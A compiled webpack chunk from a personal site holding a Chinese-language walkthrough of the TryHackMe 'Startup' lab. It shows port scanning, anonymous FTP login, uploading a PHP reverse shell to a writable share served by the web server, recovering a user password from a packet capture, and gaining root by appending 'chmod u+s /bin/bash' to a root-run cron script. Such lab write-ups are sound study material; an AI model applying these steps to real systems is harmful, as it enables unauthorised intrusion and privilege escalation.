"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[7685],{69786:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>c,contentTitle:()=>a,default:()=>p,frontMatter:()=>i,metadata:()=>o,toc:()=>l});var s=t(74848),r=t(28453);const i={sidebar_position:12,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","\u6d41\u91cf\u5305\u5206\u6790","\u5b9a\u65f6\u4efb\u52a1"],title:"Startup",sidebar_label:"Startup"},a="Startup",o={id:"box/TryHackMe/12",title:"Startup",description:"\u7aef\u53e3\u626b\u63cf",source:"@site/docs/box/TryHackMe/12.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/12",permalink:"/docs/box/TryHackMe/12",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP",permalink:"/docs/tags/\u533f\u540d\u8eab\u4efd\u767b\u9646-ftp"},{label:"\u6d41\u91cf\u5305\u5206\u6790",permalink:"/docs/tags/\u6d41\u91cf\u5305\u5206\u6790"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:12,frontMatter:{sidebar_position:12,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","\u6d41\u91cf\u5305\u5206\u6790","\u5b9a\u65f6\u4efb\u52a1"],title:"Startup",sidebar_label:"Startup"},sidebar:"boxSidebar",previous:{title:"Overpass",permalink:"/docs/box/TryHackMe/11"},next:{title:"Skynet",permalink:"/docs/box/TryHackMe/13"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data --&gt; lennie",id:"www-data----lennie",level:3},{value:"lennie --&gt; root",id:"lennie----root",level:3}];function d(n){const e={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"startup",children:"Startup"}),"\n",(0,s.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-55-94:~# rustscan -a 10.10.43.64 -u 5000 -p 21,22,80 -- -sTCV\nPORT   STATE SERVICE REASON  VERSION\n21/tcp open  ftp     syn-ack vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]\n| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg\n|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.55.94\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAzds8QxN5Q2TsERsJ98huSiuasmToUDi9JYWVegfTMV4Fn7t6/2ENm/9uYblUv+pLBnYeGo3XQGV23foZIIVMlLaC6ulYwuDOxy6KtHauVMlPRvYQd77xSCUqcM1ov9d00Y2y5eb7S6E7zIQCGFhm/jj5ui6bcr6wAIYtfpJ8UXnlHg5f/mJgwwAteQoUtxVgQWPsmfcmWvhreJ0/BF0kZJqi6uJUfOZHoUm4woJ15UYioryT6ZIw/ORL6l/LXy2RlhySNWi6P9y8UXrgKdViIlNCun7Cz80Cfc16za/8cdlthD1czxm4m5hSVwYYQK3C7mDZ0/jung0/AJzl48X1\n|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOKJ0cuq3nTYxoHlMcS3xvNisI5sKawbZHhAamhgDZTM989wIUonhYU19Jty5+fUoJKbaPIEBeMmA32XhHy+Y+E=\n|   256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnFr/4W5WTyh9XBSykso6eSO6tE0Aio3gWM8Zdsckwo\n80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Maintenance\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsx)(e.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,s.jsx)(e.p,{children:"\u53ef\u4ee5\u8fdb\u884c\u533f\u540d\u8eab\u4efd\u767b\u9646"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-55-94:~# ftp 10.10.43.64\nConnected to 10.10.43.64.\n220 (vsFTPd 3.0.3)\nName (10.10.43.64:root): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp\n-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg\n-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt\n226 Directory send OK.\nftp> ls -al\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .\ndrwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..\n-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log\ndrwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp\n-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg\n-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u6211\u4e0b\u8f7d\u4e86\u5176\u4e2d\u7684\u6587\u4ef6\uff0c \u53d1\u73b0\u5176\u5185\u5bb9\u4e3a\uff1a"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-55-94:~# cat notice.txt \nWhoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.\nroot@ip-10-10-55-94:~# cat .test.log \ntest\n"})}),"\n",(0,s.jsx)(e.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528114050.png",alt:"20240528114050"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-55-94:~# gobuster dir -u http://10.10.43.64/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.43.64/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt\n[+] Timeout:        10s\n===============================================================\n2023/08/05 02:15:46 Starting gobuster\n===============================================================\n/files (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/08/05 02:16:48 Finished\n===============================================================\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u53d1\u73b0 ",(0,s.jsx)(e.code,{children:"/files"})," \u5176\u5bf9\u5e94\u7684\u76ee\u5f55\u5f88\u50cf\u6211\u4eec\u7684 ftp \u5171\u4eab\uff0c \u90a3\u4e48\u6211\u4eec\u53c8\u6ce8\u610f\u5230\u5728ftp \u5171\u4eab\u4e2d\uff0c \u6211\u4eec\u5bf9\u4e8e ftp \u7684\u6743\u9650\u662f 777 \uff0c \u6211\u4eec\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u5728\u6b64\u4e0a\u4f20\u4e00\u4e2a WEBShell \u8fdb\u884c\u8fde\u63a5"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528114112.png",alt:"20240528114112"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"ftp> ls -al\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .\ndrwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..\n-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log\ndrwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp\n-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg\n-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt\n226 Directory send OK.\nftp> cd ftp\n250 Directory successfully changed.\nftp> put php-reverse-shell.php \nlocal: php-reverse-shell.php remote: php-reverse-shell.php\n200 PORT command successful. Consider using PASV.\n150 Ok to send data.\n226 Transfer complete.\n5493 bytes sent in 0.00 secs (141.5820 MB/s)\nftp> ls -al\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxrwxrwx    2 65534    65534        4096 Aug 05 01:20 .\ndrwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..\n-rwxrwxr-x    1 112      118          5493 Aug 05 01:20 php-reverse-shell.php\n226 Directory send OK.\nftp>\n"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528114126.png",alt:"20240528114126"})}),"\n",(0,s.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(e.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528114141.png",alt:"20240528114141"})}),"\n",(0,s.jsx)(e.p,{children:"\u6839\u636e\u63d0\u793a\u5185\u5bb9\uff0c \u6709\u4e9b\u6587\u4ef6\u4e0d\u5e94\u8be5\u5c5e\u4e8e\u6211\u4eec\uff0c \u6211\u4eec\u67e5\u627e www-data \u548c lennie \u7684\u6587\u4ef6\uff0c \u6211\u4eec\u53d1\u73b0\u4e00\u4e2a\u6d41\u91cf\u5305\u6587\u4ef6"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528114148.png",alt:"20240528114148"})}),"\n",(0,s.jsxs)(e.p,{children:["\u5206\u6790\u8fd9\u4e2a\u6d41\u91cf\u5305\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u5bc6\u7801\uff0c \u63a8\u6d4b\u662f lennie \u7684\u5bc6\u7801 ",(0,s.jsx)(e.code,{children:"c4ntg3t3n0ughsp1c3"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528114208.png",alt:"20240528114208"})}),"\n",(0,s.jsx)(e.h3,{id:"www-data----lennie",children:"www-data --\x3e lennie"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528114232.png",alt:"20240528114232"})}),"\n",(0,s.jsx)(e.h3,{id:"lennie----root",children:"lennie --\x3e root"}),"\n",(0,s.jsxs)(e.p,{children:["\u5728 lennie \u5bb6\u76ee\u5f55\u53d1\u73b0\u4e00\u4e2a scripts \u76ee\u5f55\uff0c \u5176\u662f root \u7528\u6237\u6240\u6709\uff0c \u6839\u636e\u540d\u5b57\u63a8\u65ad\u5176\u662f\u4e00\u4e2a\u5b9a\u65f6\u811a\u672c\u6587\u4ef6\uff0c \u6211\u4eec\u6ca1\u6709\u5199\u7684\u6743\u9650\uff0c \u4f46\u662f\u5b83\u8c03\u7528\u4e86 ",(0,s.jsx)(e.code,{children:"/etc/pring.sh"})," \u8fd9\u4e2a\u6587\u4ef6\u6211\u4eec\u53ef\u4ee5\u5199"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'lennie@startup:~/scripts$ cat << EOF >> /etc/print.sh\n> chmod u+s /bin/bash\n> EOF\nlennie@startup:~/scripts$ cat /etc/print.sh \n#!/bin/bash\necho "Done!"\nchmod u+s /bin/bash\nlennie@startup:~/scripts$ ls -al /bin/bash\n-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash\nlennie@startup:~/scripts$ date\nSat Aug  5 02:01:31 UTC 2023\nlennie@startup:~/scripts$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash\nlennie@startup:~/scripts$ /bin/bash -p\nlennie@startup:~/scripts# id\nuid=1002(lennie) gid=1002(lennie) euid=0(root) groups=1002(lennie)\n'})})]})}function p(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(d,{...n})}):d(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>a,x:()=>o});var s=t(96540);const r={},i=s.createContext(r);function a(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:a(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);